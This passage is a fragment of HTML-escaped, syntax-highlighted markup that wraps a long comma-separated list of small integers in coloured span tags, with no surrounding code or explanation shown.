style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;86&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;88&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;88&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; 